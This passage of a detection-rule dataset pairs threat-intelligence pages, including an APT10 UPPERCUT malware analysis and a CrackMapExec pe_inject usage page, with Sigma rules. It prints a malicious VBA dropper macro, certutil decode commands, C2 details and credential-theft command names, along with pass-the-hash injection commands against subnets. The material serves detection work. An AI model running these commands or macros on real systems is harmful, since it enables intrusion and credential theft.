|\n| グテマラ大使講演会案内状.doc (Invitation to Lecture by Guatemalan Ambassador)                                                                          | f188936d2c8423cf064d6b8160769f21 | 720384   | eservake.jetos[.]com, 151.106.53.147, 153.92.210.208 |\n| 米国接近に揺れる北朝鮮内部.doc (North Korean interior swayed by the approach of the United States)                                                      | cca227f70a64e1e7fcf5bccdc6cc25dd | 733184   | eservake.jetos[.]com, 153.92.210.208, 167.99.121.203 |\n\n*Table 1: UPPERCUT IoCs*\n\nFor the North Korean lure, a news article with an identical title was readily available online. It’s also worth noting that in the Guatemalan lure, the attacker used an unusual spelling of Guatemala in Japanese. The top result of a Google search using the same spelling led us to the event website for the lecture of the Guatemalan Ambassador, held in August 2018.\n\n```image\nAlt: Event Website for the Lecture of Guatemala Ambassador\nDescription: The image displays a webpage detailing a seminar event hosted by the Latin American Association in Tokyo, Japan. It includes information such as the date and time of the event (August 9, 2018, from 15:00 to 16:30), the venue (a specific clinic in Tokyo), and contact details including a phone number, fax number, and email address. The content appears to be an invitation that highlights the discussion topics related to Guatemala and Japan's diplomatic relations.\nTranscription: |\n  webmaster\n  平成は当協会の活動に関し格別のご支援、ご協力を賜り感謝申し上げます。\n  今回取り上げますグアテマラは、小国の多い中米諸国の中では人・経済規模で最大の国です。米国に続き今年5月に在イスラエル大使館をエルサレムに移転し、6月初めにはフェニックス山の噴火、直近では米トランプ政権のゼロ・トランスジェンダー政策による移民親子の引き離しなど、世界の目を集めています。\n  日本との関係では、国連安保理改革や国際連携を強めていく国であり、基本的価値を共有する有力なパートナー国の一つです。\n  一般、時期的に見られる各国関係駐グアテマラ大使をお招きし、比較的安定したペースで経済成長が続くよう、格差是正、環境保護、治安改善、インフラ整備といった課題を抱えるグアテマラの現状と展望をお話ししたいと思いますので、奮ってご参加ください。\n  \n  【日程】2018年8月9日（木）15：00～16：30\n  【会場】日比谷国際ビルB1 会議室（日比谷国際クリニック検診センター右隣）\n  東京都千代田区内幸町2-2-3　Tel：03-3591-3831\n  【主催】一般社団法人ラテンアメリカ協会\n  【講演】「グアテマラの現状・課題と展望」\n  【講師】古谷朋彦 駐グアテマラ特命全権大使\n  【参加費】会員2,000円、非会員3,000円／大学院生・大学生　無料\n  【備考】\n  ●申込受付：先着順 50名まで。お早めに以下からお申し込みください。\n  ●申込締切：平2018年8月6日（月）\n  以下WEBサイトからお申し込みください。\n  URL: https://latin-america.jp/seminar-entry\n  【詳細プラン】（PDF）こちらをクリック\n  \n  【ラテンアメリカ協会】\n  〒100-0011東京都千代田区内幸町2-2-3日比谷国際ビル120A\n  Tel: 03-3591-3831 Fax: 03-6205-4262 E-mail: info@latin-america.jp\n```\n\n*Figure 1: Event Website for the Lecture of Guatemala Ambassador*\n\nFigure 2 shows the macro function that displays the lure document. At the bottom of this function, we can see the readable text that matches the contact information found in Figure 1. Thus, people who would have an interest in Latin American issues may have been the targets of this campaign.\n\n```image\nAlt: Macro to display lure document\nDescription: The image displays a piece of VBA code from a Microsoft Word document. The code appears to define a subroutine named `ShowMsg()`, which constructs a message string containing contact information, including a phone number and an email address related to Latin American issues. The relevant information is highlighted in red, indicating it may be part of a lure used in a cyber attack to entice targets interested in Latin American topics.\nTranscription: |\n  vb\n  Sub ShowMsg()\n  Dim msg As String\n  msg = _\n      \"CãŽJ·ü·F '´fOfe]f}f¬ü-{åŽgu%š†\" _\n      & \"u'·ÄfO[fAfe]f}f¬I«©ÔãÛ`è,ÆW-]v\" _\n      & \"y\"üžzz 2018\"N ŒŽ9\"ü-Øj1F00\"16:30@\" _\n      & \"yžëž\"u\"J'ÚfNfŠfjfbfNC¥fƒzƒ^[%E-xj\" _\n      & \"@@@@ \"Cž`g\"ëž\"J'ÚfNfŠfjfbfNC¥fƒzƒ^\" _\n      & \"yžÄž\"é\"éŽfŽC-ç[ƒf]f}fAf5f}j\" _\n      & \"yüŽz CãJ·ü·F '´fOfe]f}f¬äžg\" _\n      & \"Tel.: 03-3591-3831\" _\n      & \"Fax: 03-6205-4262\" _\n      & \"E-mail: info@latin-america.jp\" _\n      & \"A\\ž;=,Ø,®ë,ë\" _\n      & \"ËtëWEBfJfCf,g(,®B,ë,ë\" _\n      & \"URL: https://latin-america.jp/seminar-entry\" _\n      & \"S100-0011\" _\n      & \"y\"fef\"f}fŠf}f\" _\n      & \"ActiveDocument.Content.Text = msg\n  ActiveDocument.Save\n  End Sub\n```\n\n*Figure 2: Macro to display lure document*\n\nThe initial Word documents were password protected, likely in an effort to bypass detection. Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro.\n\n```image\nAlt: Lure document\nDescription: The image displays a screenshot of a Microsoft Word document that appears to be a lure for a phishing attack. The document prompts users to enable editing and content, indicating that it contains potentially malicious VBA macros. The left side of the image shows a standard warning message from Microsoft Office about viewing the document in online mode, while the right side contains unreadable, corrupted text that likely represents the malicious payload intended to deceive the user into enabling macros.\n```\n\n*Figure 3: Lure document*\n\nFigure 4 shows what happens when the malicious macro is executed.\n\n```image\nAlt: Macro to install UPPERCUT\nDescription: The image displays a segment of VBA code used in a macro. It outlines commands for executing system-level tasks such as copying files, decoding them using 'certutil.exe', and running executables. The code indicates the steps taken by the macro to manipulate files in the user's profile and execute a payload, revealing the automated processes involved in the malicious attack.\nTranscription: |\n  vb\n  Sub ObjRun(CommandMoveTo As String, CopyTo01 As String, CopyTo02 As String, CopyTo03 As String, AllUsersProfile)\n      Dim certutilCommand As String\n      cermoveCommand = \"cmd.exe /c copy %windir%\\system32\\certutil.exe %temp%tcm.tmp\"\n      certutilCommand = \"cmd.exe /c %temp%tcm.tmp -decode \"\n      Set objws = CreateObject(\"Wscript.Shell\")\n      objws.Run CommandMoveTo, 0, True\n      objws.Run cermoveCommand, 0, True\n      objws.Run certutilCommand & AllUsersProfile & \"\\pense1.txt \" & CopyTo01, 0, True\n      objws.Run certutilCommand & AllUsersProfile & \"\\pense2.txt \" & CopyTo02, 0, True\n      objws.Run certutilCommand & AllUsersProfile & \"\\pense3.txt \" & CopyTo03, 0, True\n      objws.Run \"esentutil.exe /y \" & AllUsersProfile & \"\\GUP.exe\" & \" /o\", 0, True\n      objws.Run \"esentutil.exe /y \" & CopyTo02 & \" /d \" & AllUsersProfile & \"\\libcurl.dll\" & \" /o\", 0, True\n      objws.Run \"cmd.exe /c del /s /q \" & AllUsersProfile & \"\\*.txt\", 0, False\n  End Sub\n```\n\n*Figure 4: Macro to install UPPERCUT*\n\nThe execution workflow is as follows:\n\n1. The macro drops three PEM files, `padre1.txt`, `padre2.txt`, and `padre3.txt`, to the victim’s `%TEMP%` folder and then copies them from `%TEMP%` to the `%AllUserProfile%` folder.\n2. The macro decodes the dropped files using Windows `certutil.exe` with the following commands:\n\n   ```\n   C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre1.txt C:\\ProgramData\\\\GUP.txt\n   C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre2.txt C:\\ProgramData\\libcurl.txt\n   C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre3.txt C:\\ProgramData\\\\3F2E3AB9\n   ```\n\n3. The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (`esentutil.exe`) with the following commands:\n\n   ```\n   C:\\Windows\\System32\\esentutl.exe\" /y C:\\ProgramData\\\\GUP.txt /d C:\\ProgramData\\GUP.exe /o\n   C:\\Windows\\System32\\esentutl.exe\" /y C:\\ProgramData\\\\libcurl.txt /d C:\\ProgramData\\libcurl.dll /o\n   ```\n\nThe dropped files include the following:\n\n- `GUP.exe`: GUP, a free (LGPL) Generic Updater. GUP is an open source binary used by Notepad++ for software updates. The version used here is version 4.1 digitally signed by Notepad++.\n- `libcurl.dll`: Malicious Loader DLL\n- `3F2E3AB9`: Encrypted shellcode\n\n```image\nAlt: Notepad++ signed updater\nDescription: The image displays the properties window of a file named 'GUP.exe,' showing the digital signature details. It indicates that the signer is 'Notepad++,' with a message stating 'This digital signature is OK.' The signing time is recorded as 'Thursday, September 22, 2016 2:16:17 AM.' The window also includes sections for counter-signatures, indicating timestamps related to the digital signature.\nTranscription: |\n  GUP.exe Properties\n  \n  Digital Signature Details\n  \n  General | Advanced\n  \n  Signature list:\n  Name of signer: Notepad++\n  \n  Digital Signature Information\n  This digital signature is OK.\n  \n  Signer information:\n  Name: Notepad++\n  E-mail: Not available\n  Signing time: Thursday, September 22, 2016 2:16:17 AM\n  [View Certificate]\n  \n  Countersignatures:\n  Name of signer: E-mail address: Timestamp\n  DigiCert Timestamp: Not available Thursday, September...\n```\n\n*Figure 5: Notepad++ signed updater*\n\n4. The macro launches the legitimate executable `GUP.exe`.\n\n   - The executable sideloads the malicious DLL (`libcurl.dll`), which decrypts and runs shellcode (`3F2E3AB9`) located in the same folder.\n   - The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT. Before decoding the DLL, the shellcode uses an anti-debug technique based on `ntdll_NtSetInformationThread` which causes the thread to be detached from the debugger.\n\n```image\nAlt: Anti-debug technique used by shellcode\nDescription: The image displays a segment of assembly code related to the anti-debug technique used by malware. It shows a sequence of instructions, including pushes and calls to the `ntdll_NtSetInformationThread` function. This function is typically used to manipulate thread information, likely employed here to evade debugging during the execution of the malicious payload.\nTranscription: |\n  004AF673  push   ebx\n  004AF674  push   ebx\n  004AF675  push   11h\n  004AF677  mov    [esi+94h], eax\n  004AF67D  call   dword ptr [esi+90h] ; ntdll_NtSetInformationThread\n  004AF683  push   eax\n  004AF684  call   dword ptr [esi+94h] ; ntdll_NtSetInformationThread\n```\n\n*Figure 6: Anti-debug technique used by shellcode*\n\n5. The macro deletes the initially dropped `.txt` files using Windows `esentutl.exe` and changes the document text to an embedded message.\n\n```image\nAlt: Attack overview\nDescription: The image depicts a flowchart illustrating the execution workflow of a cyber attack involving a malicious VBA macro embedded in a Microsoft Word document. It details the steps taken after the macro is executed, including dropping three PEM files, decoding them, renaming, and executing a legitimate updater that loads a malicious DLL. The workflow is structured with arrows connecting each step, highlighting processes such as dropping files, executing commands, and loading data.\nTranscription: |\n  1. Drop 3 files\n  2. Decode\n  3. Rename\n  4. Execute\n     4.1 Load\n     4.2 Read\n  5. Delete\n```\n\n*Figure 7: Attack overview*\n\nSeveral threat actors leverage the technique of using Windows certutil.exe for payload decoding, and APT10 continues to employ this technique.\n\n## Evolution of UPPERCUT\n\n```image\nAlt: Timeline of UPPERCUT updates\nDescription: The image is a timeline chart displaying the evolution of the UPPERCUT malware updates over specific dates. It features two separate lines representing 'Doc Created Time' and 'PE Compile Time,' with points indicating various versions of the malware (5.0.0 beta1, 5.1.1 rc, 5.1.2 rc1, 5.3.2, and 5.4.1). Each point is marked with a dot and corresponds to a date on the horizontal axis, showing the progression of changes in the UPPERCUT malware across time.\nTranscription: |\n  | **Doc Created Time** | **PE Compile Time** |\n  | -------------------- | ------------------- |\n  | 2017-04-25           |                     |\n  | 2017-06-14           |                     |\n  | 2017-08-03           | 5.0.0 beta1         |\n  | 2017-09-22           | 5.1.1 rc            |\n  | 2017-11-11           |                     |\n  | 2018-02-19           |                     |\n  | 2018-04-10           |                     |\n  | 2018-05-30           | 5.1.2 rc1           |\n  | 2018-07-19           | 5.3.2               |\n  |                      | 5.4.1               |\n  | 2018-09-07           |                     |\n```\n\n*Figure 8: Timeline of UPPERCUT updates*\n\nUnlike previous versions, the exported function names are randomized in the latest version (Table 2).\n\n| **Encoded Payload**              | **Decoded Payload** |                                  |                       |             |\n|----------------------------------|---------------------|----------------------------------|-----------------------|-------------|\n| **MD5**                          | **Size**            | **Import Hash**                  | **Exported Function** | **Version** |\n|----------------------------------|---------------------|----------------------------------|-----------------------|-------------|\n| aa3f303c3319b14b4829fe2faa5999c1 | 322164              | 182ee99b4f0803628c30411b1faa9992 | l7MF25T96n45qOGWX     | 5.3.2       |\n| 126067d634d94c45084cbe1d9873d895 | 330804              | 5f45532f947501cf024d84c36e3a19a1 | hJvTJcdAU3mNkuvGGq7L  | 5.4.1       |\n| fce54b4886cac5c61eda1e7605483ca3 | 345812              | c1942a0ca397b627019dace26eca78d8 | WcuH                  | 5.4.1       |\n\n*Table 2: Static characteristics of UPPERCUT*\n\nAnother new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server. This was likely included to help the attackers understand the problem if the backdoor is unable to receive a response.\n\n```image\nAlt: Example of callback\nDescription: The image displays a raw HTTP POST request, including various headers and parameters sent to a server. Key elements include the URL path '/nCFdIVd', a Cookie with the value 'GetLastError=12031', and headers such as 'User-Agent', 'Content-Type', and 'Host'. The request indicates a form submission with URL-encoded data, likely related to the operation of malware from the UPPERCUT series.\nTranscription: |\n  POST /nCFdIVd?\n  Wkh=7U2vKLFUgK9Bej5hjJyw4RzlW7NRPsw992xy646CdK&Bx8=agmJrUBhcWkbQ0/B\n  +U95REo= &ARJYsT=hbIBuPcQcltVRwdv\n  +1E5Yk=&DXA=BZHycBEXKXWk8Hf19hzpU=&T=11Ldf16tn2Uxyc3nCQLAgzU=&w00=huFIdWvI\n  XVMRbNY0ENOLVkH8x6bXvF/njsChRsh6aChA1X4WTU=&zQNhSzWG=twPNN/\n  IPtU81&fyjfl=CB5f716vB2dITsp3XSC+MTU= HTTP/1.1\n  Cookie: GetLastError=12031\n  Accept: text/html, application/xhtml+xml, */*\n  Accept-Language: en-US\n  Content-Type: application/x-www-form-urlencoded\n  User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/ 7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0E)\n  Host: eservake.jetos.com\n  Content-Length: 13079\n  Connection: Keep-Alive\n  Cache-Control: no-cache\n```\n\n*Figure 9: Example of callback*\n\nEarlier versions of UPPERCUT used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. However, in the latest version, the keys are hard-coded uniquely for each C2 address and use the C2’s calculated MD5 hash to determine which key to use.\n\n```image\nAlt: Blowfish key generation\nDescription: The image depicts a code snippet related to the Blowfish key generation process used in the UPPERCUT malware. It includes a series of conditional statements that compare certain byte sequences (referred to as `SBYTE1`) against predefined MD5 hashes of command and control (C2) server addresses. The code shows how the Blowfish key is selected based on the matching MD5 hashes, utilizing a custom memory copy function (`custom_memcpy`) to assign the appropriate key. This technical detail highlights the security measures taken by the malware to dynamically generate encryption keys based on the C2 server.\nTranscription: |\n  if ( custom_memcmp(SBYTE1(u4), &str_c2_md5, \"f613846eb5bed227ec1a5f8df7e678d0\") )\n  {\n      custom_memcpy(str_blowfish_key, \"bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489d\");\n  }\n  else\n  {\n      v5 = &str_c2_md5;\n      if ( custom_memcmp(SBYTE1(v5), &str_c2_md5, \"f9b6f73c2793722ff28733aaa98d2da5\") )\n      {\n          custom_memcpy(str_blowfish_key, \"fb9f7fb3c709373523ff27824ed6a31d800e275ec5217d8a11024a3dffb577dd\");\n      }\n      else\n      {\n          v6 = &str_c2_md5;\n          if ( custom_memcmp(SBYTE1(u6), &str_c2_md5, \"c500dae1c412368b59f1467ee96c1\") )\n          {\n              custom_memcpy(str_blowfish_key, \"d3450966ceb2eba93282aace7d7684380d87c6621bbd3c4f621caa079356004a\");\n          }\n          else\n          {\n              custom_memcpy(str_blowfish_key, \"f12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53\");\n          }\n      }\n  }\n```\n\n*Figure 10: Blowfish key generation*\n\nFor instance, Table 3 lists the hard-coded C2 addresses, their MD5 hash, and the corresponding Blowfish key in the decoded payload of 126067d634d94c45084cbe1d9873d895.\n\n| **C2**                             | **MD5**                          | **Blowfish Key**                                                 |\n|------------------------------------|----------------------------------|------------------------------------------------------------------|\n| hxxp[:]//151.106.53[.]147/VxQG     | f613846eb5bed227ec1a5f8df7e678d0 | bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489d |\n| hxxp[:]//153.92.210[.]208/wBNh1    | 50c60f37922ff2ff8733aaeaa9802da5 | fb9f7fb3c709373523ff27824ed6a31d800e275ec5217d8a11024a3dffb577dd |\n| hxxp[:]//eservake.jetos[.]com/qIDj | c500dae1ca41236830b59f1467ee96c1 | d3450966ceb2eba93282aace7d7684380d87c6621bbd3c4f621caa079356004a |\n| Default                            | Default                          | f12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53 |\n\n*Table 3: Example of Blowfish keys*\n\nAnother difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication.\n\n```image\nAlt: URL parameters\nDescription: The image displays a table containing URL parameters associated with a malware's command and control (C2) communication. Each row lists a parameter name, its description, and an example of its encoded value. Parameters include PID, current timestamp, system OS version number, current user's username, time zone information, current directory, malware version number, and proxy information. The table format is structured, with clear headings for easy reference, making it useful for understanding how the malware communicates and logs system information.\nTranscription: |\n  | **URL Parameter** | **Description**                               | **Example**                                                                                           |\n  |-------------------|-----------------------------------------------|-------------------------------------------------------------------------------------------------------|\n  | Value 1           | PID MD5 hash of hostname/MachindGUID hostname | 94 21 00 00 A6 EF B7 96 C8 8F 97 F4 DE C5 09 C4 .!............                                        |\n  | Value 2           | Current timestamp                             | 31 35 33 34 37 36 33 37 36 37 1C 09 00 00 02 02 1534763767...                                         |\n  | Value 3           | System OS version number                      | 36 2E 31 2E 37 36 30 31                                                                               |\n  | Value 4           | Current logged in user's username             | 75 73 65 72                                                                                           |\n  | Value 5           | Time zone information                         | F8 FF FF FF 00 00 00 00 01 00 00 00                                                                   |\n  | Value 6           | Current directory                             | 43 3A 5C 44 6F 63 75 6D 65 6E 74 73 20 61 6C 6C 20 53 65 74 74 69 6E 67 73 5C 41 6C 6C 55 73 65 72 5C |\n  | Value 7           | Malware version number                        | 35 2E 34 2E 31                                                                                        |\n  | Value 8           | Proxy Information                             | 03 00 FF 00 00 00 00 00 00 00 00 31 32 37 2E 30 2E 30 2E 31:8080                                      |\n```\n\n*Table 4: URL parameters*\n\nAdditionally, the command string is hashed using the same RGPH hashing algorithm as before. Two more commands, `0xD290626C85FB1CE3` and `0x409C7A89CFF0A727`, are supported in the newer versions.\n\n| **Commands**       | **Description**                                                                          |\n|--------------------|------------------------------------------------------------------------------------------|\n| 0x97A168D9697D40DD | Download and validate file (XXHash comparison) from C2 server                            |\n| 0x7CF812296CCC68D5 | Upload file to C2 server                                                                 |\n| 0x652CB1CEFF1C0A00 | Load PE file                                                                             |\n| 0x27595F1F74B55278 | Download, validate (XXHash comparison), execute file, and send output to C2 server       |\n| 0xD290626C85FB1CE3 | Format the current timestamp                                                             |\n| 0x409C7A89CFF0A727 | Capture the desktop screenshot in PNG format and send it to C2                           |\n| None of the above  | The received buffer is executed via cmd.exe and the output is then sent to the C2 server |\n\n*Table 5: Supported commands*\n\n## Conclusion\n\nWhile APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving. In the newer versions of UPPERCUT, there is a significant change in the way backdoor initializes the Blowfish encryption key, which makes it harder for analysts to detect and decrypt the backdoor’s network communications. This shows that APT10 is very capable of maintaining and updating their malware.\n\nTo mitigate the threat, users are advised to disable Office macros in their settings and not to open documents from unknown sources. FireEye Multi-Vector Execution (MVX) engine is able to recognize and block this threat with the following detection names:\n\n- APT.Backdoor.Win.UPPERCUT\n- FE_APT_Backdoor_Win32_UPPERCUT\n\n---\n\nPosted in:\n\n- Threat Intelligence\n- Security & Identity",
    "sigma_rule": {
      "title": "Suspicious GUP Usage",
      "id": "0a4f6091-223b-41f6-8743-f322ec84930b",
      "status": "test",
      "description": "Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/apt10-targeting-japanese-corporations-using-updated-ttps/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2019-02-06",
      "modified": "2022-08-13",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\GUP.exe"
        },
        "filter_programfiles": {
          "Image|endswith": [
            "\\Program Files\\Notepad++\\updater\\GUP.exe",
            "\\Program Files (x86)\\Notepad++\\updater\\GUP.exe"
          ]
        },
        "filter_user": {
          "Image|contains": "\\Users\\",
          "Image|endswith": [
            "\\AppData\\Local\\Notepad++\\updater\\GUP.exe",
            "\\AppData\\Roaming\\Notepad++\\updater\\GUP.exe"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Execution of tools named GUP.exe and located in folders different than Notepad++\\updater"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gup_suspicious_execution.yml",
    "id": "191"
  },
  {
    "url": "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Operator Bloopers Cobalt Strike Commands",
      "id": "647c7b9e-d784-4fda-b9a0-45c565a7b729",
      "related": [
        {
          "id": "4f154fb6-27d1-4813-a759-78b93e0b9c48",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects use of Cobalt Strike commands accidentally entered in the CMD shell",
      "references": [
        "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
        "https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",
        "https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-05-06",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.003",
        "stp.1u"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "Cmd.Exe"
          },
          {
            "Image|endswith": "\\cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|startswith": [
            "cmd ",
            "cmd.exe",
            "c:\\windows\\system32\\cmd.exe"
          ],
          "CommandLine|contains": [
            "psinject",
            "spawnas",
            "make_token",
            "remote-exec",
            "rev2self",
            "dcsync",
            "logonpasswords",
            "execute-assembly",
            "getsystem"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yml",
    "id": "192"
  },
  {
    "url": "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Operator Bloopers Cobalt Strike Modules",
      "id": "4f154fb6-27d1-4813-a759-78b93e0b9c48",
      "related": [
        {
          "id": "647c7b9e-d784-4fda-b9a0-45c565a7b729",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects Cobalt Strike module/commands accidentally entered in CMD shell",
      "references": [
        "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
        "https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",
        "https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-05-06",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "Cmd.Exe"
          },
          {
            "Image|endswith": "\\cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "Invoke-UserHunter",
            "Invoke-ShareFinder",
            "Invoke-Kerberoast",
            "Invoke-SMBAutoBrute",
            "Invoke-Nightmare",
            "zerologon",
            "av_query"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_bloopers_modules.yml",
    "id": "195"
  },
  {
    "url": "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject",
    "markdown": "# CrackMapExec Pe_inject (smb)\n\nThis page contains detailed information about how to use the **pe_inject** CME module while using the **smb** protocol. For a list of all CrackMapExec modules, visit the CrackMapExec Module Library.\n\n## Description\n\n---\n\nThis module downloads the specified DLL/EXE and injects it into memory using PowerSploit's `Invoke-ReflectivePEInjection.ps1` script.\n\nThe pe_inject module is OPSEC safe. This means that it doesn't touch the disk and therefore shouldn't trigger any alarms.\n\n## Supported Protocols\n\n---\n\n- mssql\n- smb\n\n## Module Source Code\n\n---\n\n- https://github.com/byt3bl33d3r/CrackMapExec/tree/master/cme/modules/pe_inject.py\n\n## Authors\n\n---\n\n- @byt3bl33d3r\n\n## Module Options\n\n---\n\nHere is a complete list of pe_inject module options:\n\n```\n# cme smb -M pe_inject --options\n[*] pe_inject module options:\n\n            PATH     Path to dll/exe to inject\n            PROCID   Process ID to inject into (default: current powershell process)\n            EXEARGS  Arguments to pass to the executable being reflectively loaded (default: None)\n```\n\nThe `PATH` option is required! Make sure to set it when using this module.\n\n## Module Usage\n\n---\n\nThis is how to use the pe_inject module while using the smb protocol:\n\n```\nSyntax:\n# cme smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M pe_inject -o PATH=<path>\n\nLocal admin:\n# cme smb 10.0.5.1 -u Administrator -p P@ss123 -d . -M pe_inject -o PATH=/path/to/bin.dll\n# cme smb 10.0.5.1 -u Administrator -p P@ss123 --local-auth -M pe_inject -o PATH=/path/to/bin.dll\n\nDomain user:\n# cme smb 10.0.5.1 -u bkpadmin -p P@ss123 -d target.corp -M pe_inject -o PATH=/path/to/bin.dll\n```\n\nCrackMapExec also supports passing the hash, so you can specify NTLM hash instead of a password:\n\n```\n# cme smb 10.0.5.1 -u Administrator -H 432b022dc22aa5afe884e986b8383ff2 -d . -M pe_inject -o PATH=/path/to/bin.dll\n# cme smb 10.0.5.1 -u bkpadmin -H 432b022dc22aa5afe884e986b8383ff2 -d target.corp -M pe_inject -o PATH=/path/to/bin.dll\n```\n\nThe pe_inject module can also be used against multiple hosts. Here's how to run it against multiple hosts:\n\n```\n# cme smb target_list.txt -u Administrator -p P@ss123 -d . -M pe_inject -o PATH=/path/to/bin.dll\n# cme smb 10.0.5.0/24 -u Administrator -p P@ss123 -d . -M pe_inject -o PATH=/path/to/bin.dll\n# cme smb 10.0.5.1-100 -u Administrator -p P@ss123 -d . -M pe_inject -o PATH=/path/to/bin.dll\n```\n\n## References\n\n---\n\n- https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/\n- https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1\n\n## Version\n\n---\n\nThis page has been created based on CrackMapExec version 5.1.7dev.\nVisit CrackMapExec Module Library for more modules.",
    "sigma_rule": {
      "title": "HackTool - CrackMapExec Execution",
      "id": "42a993dd-bb3e-48c8-b372-4d6684c4106c",
      "status": "test",
      "description": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.",
      "references": [
        "https://web.archive.org/web/20220625234519/https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local",
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-25",
      "modified": "2023-03-08",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.credential-access",
        "attack.discovery",
        "attack.t1047",
        "attack.t1053",
        "attack.t1059.003",
        "attack.t1059.001",
        "attack.t1110",
        "attack.t1201"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_binary": {
          "Image|endswith": "\\crackmapexec.exe"
        },
        "selection_special": {
          "CommandLine|contains": " -M pe_inject "
        },
        "selection_execute": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -x "
          ]
        },
        "selection_hash": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p ",
            " -H 'NTHASH'"
          ]
        },
        "selection_module_mssql": {
          "CommandLine|contains|all": [
            " mssql ",
            " -u ",
            " -p ",
            " -M ",
            " -d "
          ]
        },
        "selection_module_smb1": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -H ",
            " -M ",
            " -o "
          ]
        },
        "selection_module_smb2": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -p ",
            " --local-auth"
          ]
        },
        "part_localauth_1": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p "
          ]
        },
        "part_localauth_2": {
          "CommandLine|contains|all": [
            " 10.",
            " 192.168.",
            "/24 "
          ]
        },
        "condition": "1 of selection_* or all of part_localauth*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_crackmapexec_execution.yml",
    "id": "207"
  },
  {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east",
